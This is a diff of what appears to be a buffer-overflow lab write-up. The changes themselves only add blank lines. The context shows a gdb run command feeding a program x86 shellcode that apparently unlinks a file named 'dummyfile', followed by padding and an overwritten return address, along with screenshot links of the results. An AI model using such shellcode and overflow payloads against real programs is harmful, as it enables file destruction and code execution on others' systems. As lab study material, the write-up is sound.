@@ -39,8 +39,10 @@ run code (it's still x00 at the end, so i will change it):
   r $(python -c "print('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x89\xc0\x34\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x01' + 'a'*32 + '\xff\xff\xff\xff')")
 after run:
   ![image](https://github.com/user-attachments/assets/1a2cb6fe-7008-434d-ac18-673b80c49fe4)
+  
 change return address and 0xffffd6cb = 0x00:
 ![image](https://github.com/user-attachments/assets/74098831-1904-460e-8d92-01ef41caba9d)
+
 and after continue, the result:
 
 ![image](https://github.com/user-attachments/assets/fbd2fd9b-5c39-450c-8b69-511415f067fe)
